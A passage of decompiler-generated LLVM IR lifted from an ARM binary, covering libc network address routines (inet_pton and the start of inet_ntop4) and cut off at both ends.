  %v4_106ec = add i32 %v3_106ec, %v2_106ec
  store i32 %v4_106ec, i32* @r3, align 4
  %v2_106f0 = icmp ugt i32 %v4_106ec, 254
  %v7_106f0 = icmp eq i32 %v4_106ec, 255
  store i1 %v7_106f0, i1* %cpsr_z.global-to-local, align 1
  %v2_106f4 = xor i1 %v7_106f0, true
  %v3_106f4 = and i1 %v2_106f0, %v2_106f4
  br i1 %v3_106f4, label %dec_label_pc_10770, label %dec_label_pc_106f8

dec_label_pc_106f8:                               ; preds = %dec_label_pc_106e8
  %v0_106f8 = load i32, i32* @lr, align 4
  %v2_106f8 = icmp eq i32 %v0_106f8, 0
  store i1 %v2_106f8, i1* %cpsr_z.global-to-local, align 1
  %v1_106fc = trunc i32 %v4_106ec to i8
  store i8 %v1_106fc, i8* %v1_106e8, align 1
  %v0_10700 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10700, label %dec_label_pc_10704, label %dec_label_pc_1073c.backedge

dec_label_pc_10704:                               ; preds = %dec_label_pc_106f8
  %v0_10704 = load i32, i32* @ip, align 4
  %v1_10704 = add i32 %v0_10704, 1
  store i32 %v1_10704, i32* @ip, align 4
  %v7_10708 = icmp eq i32 %v1_10704, 4
  store i1 %v7_10708, i1* %cpsr_z.global-to-local, align 1
  %v0_1070c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1070c, i32* @lr, align 4
  %v8_10710 = icmp sgt i32 %v1_10704, 4
  br i1 %v8_10710, label %dec_label_pc_10770, label %dec_label_pc_1073c.backedge

dec_label_pc_10718:                               ; preds = %dec_label_pc_106dc
  %v7_10718 = icmp eq i32 %v0_10718, 46
  %v1_10720 = load i32, i32* @lr, align 4
  %v2_10720 = urem i32 %v1_10720, 2
  %storemerge12 = select i1 %v7_10718, i32 %v2_10720, i32 0
  store i32 %storemerge12, i32* @r3, align 4
  %v2_10724 = icmp eq i32 %storemerge12, 0
  store i1 %v2_10724, i1* %cpsr_z.global-to-local, align 1
  %v0_10728 = load i32, i32* @r5, align 4
  store i32 %v0_10728, i32* @lr, align 4
  br i1 %v2_10724, label %dec_label_pc_10770, label %dec_label_pc_10730

dec_label_pc_10730:                               ; preds = %dec_label_pc_10718
  %v0_10730 = load i32, i32* @ip, align 4
  %v7_10730 = icmp eq i32 %v0_10730, 4
  store i1 %v7_10730, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10730, label %dec_label_pc_10770, label %dec_label_pc_10738

dec_label_pc_10738:                               ; preds = %dec_label_pc_10730
  %v1_10738 = trunc i32 %v0_10728 to i8
  %v2_10738 = load i32, i32* %r1.global-to-local, align 4
  %v3_10738 = add i32 %v2_10738, 1
  %v4_10738 = inttoptr i32 %v3_10738 to i8*
  store i8 %v1_10738, i8* %v4_10738, align 1
  %v5_10738 = load i32, i32* %r1.global-to-local, align 4
  %v6_10738 = add i32 %v5_10738, 1
  store i32 %v6_10738, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1073c.backedge

dec_label_pc_1073c.backedge:                      ; preds = %dec_label_pc_10738, %dec_label_pc_106f8, %dec_label_pc_10704
  %v0_1073c = load i32, i32* %r0.global-to-local, align 4
  %v1_1073c = inttoptr i32 %v0_1073c to i8*
  %v2_1073c = load i8, i8* %v1_1073c, align 1
  %v3_1073c = zext i8 %v2_1073c to i32
  store i32 %v3_1073c, i32* @r3, align 4
  %v2_10740 = icmp eq i8 %v2_1073c, 0
  store i1 %v2_10740, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10740, label %dec_label_pc_1073c.dec_label_pc_1074c_crit_edge, label %dec_label_pc_106dc

dec_label_pc_1073c.dec_label_pc_1074c_crit_edge:  ; preds = %dec_label_pc_1073c.backedge
  %v0_1074c.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_1074c

dec_label_pc_1074c:                               ; preds = %dec_label_pc_1073c.dec_label_pc_1074c_crit_edge, %entry
  %v0_1074c = phi i32 [ %v0_1074c.pre, %dec_label_pc_1073c.dec_label_pc_1074c_crit_edge ], [ 0, %entry ]
  %v7_1074c = icmp eq i32 %v0_1074c, 3
  store i1 %v7_1074c, i1* %cpsr_z.global-to-local, align 1
  %v7_10750 = icmp slt i32 %v0_1074c, 4
  br i1 %v7_10750, label %dec_label_pc_10770, label %dec_label_pc_10754

dec_label_pc_10754:                               ; preds = %dec_label_pc_1074c
  %v0_10754 = load i32, i32* @r4, align 4
  store i32 %v0_10754, i32* @r0, align 4
  store i32 %v2_106c4, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_10760 = call i32 @memcpy()
  br label %dec_label_pc_10770

dec_label_pc_10770:                               ; preds = %dec_label_pc_106e8, %dec_label_pc_10704, %dec_label_pc_10718, %dec_label_pc_10730, %dec_label_pc_1074c, %dec_label_pc_10754
  %storemerge = phi i32 [ 1, %dec_label_pc_10754 ], [ 0, %dec_label_pc_1074c ], [ 0, %dec_label_pc_10730 ], [ 0, %dec_label_pc_10718 ], [ 0, %dec_label_pc_10704 ], [ 0, %dec_label_pc_106e8 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v3_106ac, i32* @r4, align 4
  store i32 %v6_106ac, i32* @r5, align 4
  store i32 %v15_106ac, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1074c, { 1, 0 }
  uselistorder i32 %v3_1073c, { 2, 1, 0 }
  uselistorder i32 %v0_1073c, { 1, 0 }
  uselistorder i32 %storemerge12, { 1, 0 }
  uselistorder i32 %v2_106ec, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 8, 1, 2, 3, 4, 5, 6, 7, 9 }
  uselistorder label %dec_label_pc_10770, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1073c.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_106dc, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v3_1077c = load i32, i32* @r4, align 4
  %v6_1077c = load i32, i32* @r5, align 4
  %v9_1077c = load i32, i32* @r6, align 4
  %v12_1077c = load i32, i32* @r7, align 4
  %v27_1077c = load i32, i32* @lr, align 4
  %v7_10788 = icmp eq i32 %arg1, 2
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  br i1 %v7_10788, label %dec_label_pc_107a8, label %dec_label_pc_1079c

dec_label_pc_1079c:                               ; preds = %entry
  %v7_1079c = icmp eq i32 %arg1, 10
  br i1 %v7_1079c, label %dec_label_pc_107b8, label %dec_label_pc_10970

dec_label_pc_107a8:                               ; preds = %entry
  store i32 %tmp, i32* @r0, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v3_107b0 = call i32 @inet_pton4(i32 %tmp, i32 %arg3)
  br label %dec_label_pc_10980

dec_label_pc_107b8:                               ; preds = %dec_label_pc_1079c
  %v2_107b8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 16, i32* @r2, align 4
  %v2_107c4 = bitcast i32* %stack_var_-56 to i8*
  %v3_107c4 = call i32 @__GI_memset(i8* %v2_107c4, i32 0)
  %v0_107c8 = load i32, i32* @r5, align 4
  %v1_107c8 = inttoptr i32 %v0_107c8 to i8*
  %v2_107c8 = load i8, i8* %v1_107c8, align 1
  %v3_107c8 = zext i8 %v2_107c8 to i32
  store i32 %v3_107c8, i32* %r3.global-to-local, align 4
  %v7_107cc = icmp eq i8 %v2_107c8, 58
  store i32 %v3_107c4, i32* @r6, align 4
  %v2_107d4 = add i32 %v3_107c4, 16
  store i32 %v2_107d4, i32* %r8.global-to-local, align 4
  br i1 %v7_107cc, label %dec_label_pc_107dc, label %dec_label_pc_107e8

dec_label_pc_107dc:                               ; preds = %dec_label_pc_107b8
  %v1_107dc = add i32 %v0_107c8, 1
  %v2_107dc = inttoptr i32 %v1_107dc to i8*
  %v3_107dc = load i8, i8* %v2_107dc, align 1
  %v4_107dc = zext i8 %v3_107dc to i32
  store i32 %v4_107dc, i32* %r3.global-to-local, align 4
  store i32 %v1_107dc, i32* @r5, align 4
  %v7_107e0 = icmp eq i8 %v3_107dc, 58
  br i1 %v7_107e0, label %dec_label_pc_107e8, label %dec_label_pc_10968

dec_label_pc_107e8:                               ; preds = %dec_label_pc_107dc, %dec_label_pc_107b8
  %v0_107f4 = phi i32 [ %v1_107dc, %dec_label_pc_107dc ], [ %v0_107c8, %dec_label_pc_107b8 ]
  store i32 -37300, i32* @r3, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v0_107f0 = load i32, i32* @r4, align 4
  %v2_107f0 = add i32 %v0_107f0, -37300
  store i32 %v0_107f4, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  store i32 %v2_107f0, i32* %stack_var_-64, align 4
  %v1_108cc3 = inttoptr i32 %v0_107f4 to i8*
  %v2_108cc4 = load i8, i8* %v1_108cc3, align 1
  %v3_108cc5 = zext i8 %v2_108cc4 to i32
  store i32 %v3_108cc5, i32* @r4, align 4
  %v2_108d06 = icmp eq i8 %v2_108cc4, 0
  br i1 %v2_108d06, label %dec_label_pc_108d8.thread, label %dec_label_pc_10808

dec_label_pc_108d8.thread:                        ; preds = %dec_label_pc_107e8
  store i32 %v3_107c4, i32* @r4, align 4
  br label %dec_label_pc_10904

dec_label_pc_10808:                               ; preds = %dec_label_pc_107e8, %dec_label_pc_108cc.backedge.dec_label_pc_10808_crit_edge
  %v0_1080c = phi i32 [ %v3_108cc, %dec_label_pc_108cc.backedge.dec_label_pc_10808_crit_edge ], [ %v3_108cc5, %dec_label_pc_107e8 ]
  %v2_10808 = phi i32 [ %v2_10808.pre, %dec_label_pc_108cc.backedge.dec_label_pc_10808_crit_edge ], [ %v2_107f0, %dec_label_pc_107e8 ]
  store i32 %v2_10808, i32* @r0, align 4
  %v1_1080c = or i32 %v0_1080c, 32
  store i32 %v1_1080c, i32* %r1.global-to-local, align 4
  %v2_10810 = call i32 @__GI_strchr(i32 %v2_10808, i32 %v1_1080c)
  %v2_10814 = icmp eq i32 %v2_10810, 0
  %v0_10818 = load i32, i32* @r5, align 4
  %v1_10818 = add i32 %v0_10818, 1
  store i32 %v1_10818, i32* @r5, align 4
  br i1 %v2_10814, label %dec_label_pc_1083c, label %dec_label_pc_10820

dec_label_pc_10820:                               ; preds = %dec_label_pc_10808
  %v2_10820 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_10820, i32* %r2.global-to-local, align 4
  %v2_10824 = sub i32 %v2_10810, %v2_10820
  %v1_10828 = load i32, i32* @r7, align 4
  %v4_10828 = mul i32 %v1_10828, 16
  %v5_10828 = or i32 %v4_10828, %v2_10824
  store i32 %v5_10828, i32* @r7, align 4
  store i32 65535, i32* @r3, align 4
  %tmp36 = icmp ult i32 %v5_10828, 65536
  br i1 %tmp36, label %dec_label_pc_108c8, label %dec_label_pc_10968

dec_label_pc_1083c:                               ; preds = %dec_label_pc_10808
  %v0_1083c = load i32, i32* @r4, align 4
  %v7_1083c = icmp eq i32 %v0_1083c, 58
  br i1 %v7_1083c, label %dec_label_pc_10844, label %dec_label_pc_1089c

dec_label_pc_10844:                               ; preds = %dec_label_pc_1083c
  %v0_10844 = load i32, i32* %sb.global-to-local, align 4
  %v2_10844 = icmp eq i32 %v0_10844, 0
  br i1 %v2_10844, label %dec_label_pc_1084c, label %dec_label_pc_10860

dec_label_pc_1084c:                               ; preds = %dec_label_pc_10844
  %v0_1084c = load i32, i32* %fp.global-to-local, align 4
  %v2_1084c = icmp eq i32 %v0_1084c, 0
  br i1 %v2_1084c, label %dec_label_pc_10854, label %dec_label_pc_10968

dec_label_pc_10854:                               ; preds = %dec_label_pc_1084c
  %v0_10854 = load i32, i32* @r6, align 4
  store i32 %v0_10854, i32* %fp.global-to-local, align 4
  store i32 %v1_10818, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_108cc.backedge

dec_label_pc_10860:                               ; preds = %dec_label_pc_10844
  %v1_10860 = inttoptr i32 %v1_10818 to i8*
  %v2_10860 = load i8, i8* %v1_10860, align 1
  %v3_10860 = zext i8 %v2_10860 to i32
  store i32 %v3_10860, i32* %r3.global-to-local, align 4
  %v2_10864 = icmp eq i8 %v2_10860, 0
  br i1 %v2_10864, label %dec_label_pc_10968, label %dec_label_pc_1086c

dec_label_pc_1086c:                               ; preds = %dec_label_pc_10860
  %v0_1086c = load i32, i32* @r6, align 4
  %v1_1086c = add i32 %v0_1086c, 2
  store i32 %v1_1086c, i32* %r3.global-to-local, align 4
  %v1_10870 = load i32, i32* %r8.global-to-local, align 4
  %tmp37 = icmp ugt i32 %v1_1086c, %v1_10870
  br i1 %tmp37, label %dec_label_pc_10968, label %dec_label_pc_10878

dec_label_pc_10878:                               ; preds = %dec_label_pc_1086c
  %v0_10878 = load i32, i32* @r7, align 4
  %v3_10878 = udiv i32 %v0_10878, 256
  store i32 %v3_10878, i32* %r2.global-to-local, align 4
  store i32 %v0_1086c, i32* %r3.global-to-local, align 4
  %v1_10880 = trunc i32 %v3_10878 to i8
  %v3_10880 = inttoptr i32 %v0_1086c to i8*
  store i8 %v1_10880, i8* %v3_10880, align 1
  %v4_10880 = load i32, i32* %r3.global-to-local, align 4
  %v5_10880 = add i32 %v4_10880, 1
  store i32 %v5_10880, i32* @r3, align 4
  %v0_10884 = load i32, i32* @r7, align 4
  %v1_10884 = trunc i32 %v0_10884 to i8
  %v2_10884 = load i32, i32* @r6, align 4
  %v3_10884 = add i32 %v2_10884, 1
  %v4_10884 = inttoptr i32 %v3_10884 to i8*
  store i8 %v1_10884, i8* %v4_10884, align 1
  store i32 0, i32* @r7, align 4
  %v0_1088c = load i32, i32* @r3, align 4
  %v1_1088c = add i32 %v0_1088c, 1
  store i32 %v1_1088c, i32* @r6, align 4
  %v0_10890 = load i32, i32* @r5, align 4
  store i32 %v0_10890, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_108cc.backedge

dec_label_pc_1089c:                               ; preds = %dec_label_pc_1083c
  %v7_1089c = icmp eq i32 %v0_1083c, 46
  br i1 %v7_1089c, label %dec_label_pc_108a4, label %dec_label_pc_10968

dec_label_pc_108a4:                               ; preds = %dec_label_pc_1089c
  %v0_108a4 = load i32, i32* @r6, align 4
  %v1_108a4 = add i32 %v0_108a4, 4
  store i32 %v1_108a4, i32* @r4, align 4
  %v1_108a8 = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_108a4, %v1_108a8
  br i1 %tmp38, label %dec_label_pc_10968, label %dec_label_pc_108b0

dec_label_pc_108b0:                               ; preds = %dec_label_pc_108a4
  %v0_108b0 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_108b0, i32* @r0, align 4
  store i32 %v0_108a4, i32* %r1.global-to-local, align 4
  %v3_108b8 = call i32 @inet_pton4(i32 %v0_108b0, i32 %v0_108a4)
  %v5_108c0 = icmp sgt i32 %v3_108b8, 0
  br i1 %v5_108c0, label %dec_label_pc_108b0.dec_label_pc_10904_crit_edge, label %dec_label_pc_10968

dec_label_pc_108b0.dec_label_pc_10904_crit_edge:  ; preds = %dec_label_pc_108b0
  %v0_10948.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10904

dec_label_pc_108c8:                               ; preds = %dec_label_pc_10820
  store i32 1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_108cc.backedge

dec_label_pc_108cc.backedge:                      ; preds = %dec_label_pc_108c8, %dec_label_pc_10854, %dec_label_pc_10878
  %v0_108cc = phi i32 [ %v1_10818, %dec_label_pc_108c8 ], [ %v1_10818, %dec_label_pc_10854 ], [ %v0_10890, %dec_label_pc_10878 ]
  %v0_108d812 = phi i32 [ 1, %dec_label_pc_108c8 ], [ 0, %dec_label_pc_10854 ], [ 0, %dec_label_pc_10878 ]
  %v1_108cc = inttoptr i32 %v0_108cc to i8*
  %v2_108cc = load i8, i8* %v1_108cc, align 1
  %v3_108cc = zext i8 %v2_108cc to i32
  store i32 %v3_108cc, i32* @r4, align 4
  %v2_108d0 = icmp eq i8 %v2_108cc, 0
  br i1 %v2_108d0, label %dec_label_pc_108d8, label %dec_label_pc_108cc.backedge.dec_label_pc_10808_crit_edge

dec_label_pc_108cc.backedge.dec_label_pc_10808_crit_edge: ; preds = %dec_label_pc_108cc.backedge
  %v2_10808.pre = load i32, i32* %stack_var_-64, align 4
  br label %dec_label_pc_10808

dec_label_pc_108d8:                               ; preds = %dec_label_pc_108cc.backedge
  %v0_108dc.pre = load i32, i32* @r6, align 4
  %v2_108d8 = icmp eq i32 %v0_108d812, 0
  store i32 %v0_108dc.pre, i32* @r4, align 4
  br i1 %v2_108d8, label %dec_label_pc_10904, label %dec_label_pc_108e4

dec_label_pc_108e4:                               ; preds = %dec_label_pc_108d8
  %v1_108e4 = add i32 %v0_108dc.pre, 2
  store i32 %v1_108e4, i32* %r3.global-to-local, align 4
  %v1_108e8 = load i32, i32* %r8.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v1_108e4, %v1_108e8
  br i1 %tmp39, label %dec_label_pc_10968, label %dec_label_pc_108f0

dec_label_pc_108f0:                               ; preds = %dec_label_pc_108e4
  store i32 %v0_108dc.pre, i32* %r3.global-to-local, align 4
  %v0_108f4 = load i32, i32* @r7, align 4
  %v3_108f4 = udiv i32 %v0_108f4, 256
  store i32 %v3_108f4, i32* %r2.global-to-local, align 4
  %v1_108f8 = trunc i32 %v3_108f4 to i8
  %v3_108f8 = inttoptr i32 %v0_108dc.pre to i8*
  store i8 %v1_108f8, i8* %v3_108f8, align 1
  %v4_108f8 = load i32, i32* %r3.global-to-local, align 4
  %v5_108f8 = add i32 %v4_108f8, 1
  store i32 %v5_108f8, i32* @r3, align 4
  %v0_108fc = load i32, i32* @r7, align 4
  %v1_108fc = trunc i32 %v0_108fc to i8
  %v2_108fc = load i32, i32* @r6, align 4
  %v3_108fc = add i32 %v2_108fc, 1
  %v4_108fc = inttoptr i32 %v3_108fc to i8*
  store i8 %v1_108fc, i8* %v4_108fc, align 1
  %v0_10900 = load i32, i32* @r3, align 4
  %v1_10900 = add i32 %v0_10900, 1
  store i32 %v1_10900, i32* @r4, align 4
  br label %dec_label_pc_10904

dec_label_pc_10904:                               ; preds = %dec_label_pc_108b0.dec_label_pc_10904_crit_edge, %dec_label_pc_108d8.thread, %dec_label_pc_108d8, %dec_label_pc_108f0
  %v0_10948.pre = phi i32 [ %v0_10948.pre.pre, %dec_label_pc_108b0.dec_label_pc_10904_crit_edge ], [ %v3_107c4, %dec_label_pc_108d8.thread ], [ %v0_108dc.pre, %dec_label_pc_108d8 ], [ %v1_10900, %dec_label_pc_108f0 ]
  %v0_10904 = load i32, i32* %fp.global-to-local, align 4
  %v2_10904 = icmp eq i32 %v0_10904, 0
  %v1_10948.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_10904, label %dec_label_pc_10948, label %dec_label_pc_1090c

dec_label_pc_1090c:                               ; preds = %dec_label_pc_10904
  %v9_1090c = icmp eq i32 %v0_10948.pre, %v1_10948.pre
  %v2_10910 = sub i32 %v0_10948.pre, %v0_10904
  store i32 %v2_10910, i32* @ip, align 4
  br i1 %v9_1090c, label %dec_label_pc_10968, label %dec_label_pc_10930.preheader

dec_label_pc_10930.preheader:                     ; preds = %dec_label_pc_1090c
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_10930

dec_label_pc_10924:                               ; preds = %dec_label_pc_10930
  %v2_10938 = sub i32 %v0_10944, %v0_1093c
  %v0_10924 = load i32, i32* %fp.global-to-local, align 4
  %v2_10924 = add i32 %v0_10924, %v2_10934
  %v3_10924 = inttoptr i32 %v2_10924 to i8*
  %v4_10924 = load i8, i8* %v3_10924, align 1
  %v6_10924 = zext i8 %v4_10924 to i32
  store i32 %v6_10924, i32* @r3, align 4
  %v3_10928 = inttoptr i32 %v2_10938 to i8*
  store i8 %v4_10924, i8* %v3_10928, align 1
  %v0_1092c = load i32, i32* @lr, align 4
  %v1_1092c = trunc i32 %v0_1092c to i8
  %v2_1092c = load i32, i32* %fp.global-to-local, align 4
  %v3_1092c = load i32, i32* %r1.global-to-local, align 4
  %v4_1092c = add i32 %v3_1092c, %v2_1092c
  %v5_1092c = inttoptr i32 %v4_1092c to i8*
  store i8 %v1_1092c, i8* %v5_1092c, align 1
  %v0_10930.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10930.pre = load i32, i32* @ip, align 4
  %v1_10938.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10930

dec_label_pc_10930:                               ; preds = %dec_label_pc_10930.preheader, %dec_label_pc_10924
  %v0_10944 = phi i32 [ %v1_10948.pre, %dec_label_pc_10930.preheader ], [ %v1_10938.pre, %dec_label_pc_10924 ]
  %v1_10934 = phi i32 [ %v2_10910, %dec_label_pc_10930.preheader ], [ %v1_10930.pre, %dec_label_pc_10924 ]
  %v0_1093c = phi i32 [ 1, %dec_label_pc_10930.preheader ], [ %v0_10930.pre, %dec_label_pc_10924 ]
  %v2_10930 = sub i32 %v0_1093c, %v1_10934
  %v4_10930 = xor i32 %v0_1093c, %v1_10934
  %v5_10930 = xor i32 %v2_10930, %v0_1093c
  %v6_10930 = and i32 %v5_10930, %v4_10930
  %v7_10930 = icmp slt i32 %v6_10930, 0
  %v8_10930 = icmp slt i32 %v2_10930, 0
  %v9_10930 = icmp eq i32 %v0_1093c, %v1_10934
  %v2_10934 = sub i32 %v1_10934, %v0_1093c
  store i32 %v2_10934, i32* %r1.global-to-local, align 4
  %v1_1093c = add i32 %v0_1093c, 1
  store i32 %v1_1093c, i32* %r2.global-to-local, align 4
  %v3_10940 = xor i1 %v8_10930, %v7_10930
  %v4_10940 = or i1 %v9_10930, %v3_10940
  br i1 %v4_10940, label %dec_label_pc_10924, label %dec_label_pc_10944

dec_label_pc_10944:                               ; preds = %dec_label_pc_10930
  store i32 %v0_10944, i32* @r4, align 4
  br label %dec_label_pc_10948

dec_label_pc_10948:                               ; preds = %dec_label_pc_10904, %dec_label_pc_10944
  %v0_10948 = phi i32 [ %v0_10944, %dec_label_pc_10944 ], [ %v0_10948.pre, %dec_label_pc_10904 ]
  %v1_10948 = phi i32 [ %v0_10944, %dec_label_pc_10944 ], [ %v1_10948.pre, %dec_label_pc_10904 ]
  %v9_10948 = icmp eq i32 %v0_10948, %v1_10948
  br i1 %v9_10948, label %dec_label_pc_10950, label %dec_label_pc_10968

dec_label_pc_10950:                               ; preds = %dec_label_pc_10948
  store i32 %arg3, i32* @r0, align 4
  store i32 %v2_107b8, i32* @r1, align 4
  store i32 16, i32* @r2, align 4
  %v0_1095c = call i32 @memcpy()
  br label %dec_label_pc_10980

dec_label_pc_10968:                               ; preds = %dec_label_pc_10820, %dec_label_pc_1084c, %dec_label_pc_1086c, %dec_label_pc_10860, %dec_label_pc_1090c, %dec_label_pc_108b0, %dec_label_pc_1089c, %dec_label_pc_10948, %dec_label_pc_107dc, %dec_label_pc_108e4, %dec_label_pc_108a4
  br label %dec_label_pc_10980

dec_label_pc_10970:                               ; preds = %dec_label_pc_1079c
  %v0_10970 = call i32 @__GI___errno_location()
  store i32 97, i32* %r3.global-to-local, align 4
  %v2_10978 = inttoptr i32 %v0_10970 to i32*
  store i32 97, i32* %v2_10978, align 4
  br label %dec_label_pc_10980

dec_label_pc_10980:                               ; preds = %dec_label_pc_10968, %dec_label_pc_10950, %dec_label_pc_107a8, %dec_label_pc_10970
  %v1_10988 = phi i32 [ 0, %dec_label_pc_10968 ], [ 1, %dec_label_pc_10950 ], [ %v3_107b0, %dec_label_pc_107a8 ], [ -1, %dec_label_pc_10970 ]
  store i32 %v3_1077c, i32* @r4, align 4
  store i32 %v6_1077c, i32* @r5, align 4
  store i32 %v9_1077c, i32* @r6, align 4
  store i32 %v12_1077c, i32* @r7, align 4
  store i32 %v27_1077c, i32* @lr, align 4
  ret i32 %v1_10988

; uselistorder directives
  uselistorder i32 %v2_10934, { 1, 0 }
  uselistorder i32 %v2_10930, { 1, 0 }
  uselistorder i32 %v0_1093c, { 2, 3, 6, 0, 1, 5, 4 }
  uselistorder i32 %v1_10934, { 1, 3, 0, 2 }
  uselistorder i32 %v0_10944, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10948.pre, { 0, 2, 1 }
  uselistorder i32 %v0_10948.pre, { 2, 0, 1 }
  uselistorder i32 %v3_108f4, { 1, 0 }
  uselistorder i32 %v0_108dc.pre, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v3_108cc, { 1, 0 }
  uselistorder i32 %v0_108a4, { 1, 0, 2 }
  uselistorder i32 %v3_10878, { 1, 0 }
  uselistorder i32 %v0_1086c, { 1, 0, 2 }
  uselistorder i32 %v1_10818, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_10808, { 1, 0 }
  uselistorder i32 %v0_107f4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 0, 4, 1, 2, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 (i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10980, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10968, { 7, 4, 9, 5, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_10948, { 1, 0 }
  uselistorder label %dec_label_pc_10930, { 1, 0 }
  uselistorder label %dec_label_pc_10904, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_108cc.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10808, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-57 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %arg3, i32* %stack_var_-72, align 4
  store i32 0, i32* %stack_var_-57, align 4
  %v2_10a70 = ptrtoint i32* %stack_var_-40 to i32
  %v2_10a50 = add i32 %v2_10a70, -17
  br label %dec_label_pc_10a70

dec_label_pc_109c0:                               ; preds = %dec_label_pc_10a70
  %v0_109c0 = load i32, i32* %fp.global-to-local, align 4
  %v2_109c0 = add i32 %v0_109c0, %v1_109c0
  %v3_109c0 = inttoptr i32 %v2_109c0 to i8*
  %v4_109c0 = load i8, i8* %v3_109c0, align 1
  %v6_109c0 = zext i8 %v4_109c0 to i32
  store i32 %v6_109c0, i32* %r4.global-to-local, align 4
  %div4 = udiv i8 %v4_109c0, 100
  %v2_109c8 = zext i8 %div4 to i32
  store i32 %v2_109c8, i32* %r0.global-to-local, align 4
  %v1_109cc = or i8 %div4, 48
  %v3_109d0 = add i32 %v2_10a80, -17
  %v4_109d0 = inttoptr i32 %v3_109d0 to i8*
  store i8 %v1_109cc, i8* %v4_109d0, align 1
  %v0_109d4 = load i32, i32* %r5.global-to-local, align 4
  %v1_109d4 = add i32 %v0_109d4, -17
  %v2_109d4 = inttoptr i32 %v1_109d4 to i8*
  %v3_109d4 = load i8, i8* %v2_109d4, align 1
  %v0_109d8 = load i32, i32* %r6.global-to-local, align 4
  %v1_109d8 = add i32 %v0_109d8, 1
  store i32 %v1_109d8, i32* %r6.global-to-local, align 4
  store i32 %v2_10a70, i32* %r2.global-to-local, align 4
  %v7_109e0 = icmp eq i8 %v3_109d4, 48
  %v0_109e8 = load i32, i32* %r4.global-to-local, align 4
  %v0_109f0 = load i32, i32* %fp.global-to-local, align 4
  %v1_109f0 = load i32, i32* %sl.global-to-local, align 4
  %v2_109f0 = add i32 %v1_109f0, %v0_109f0
  store i32 %v2_109f0, i32* %sb.global-to-local, align 4
  %v2_109f8 = udiv i32 %v0_109e8, 10
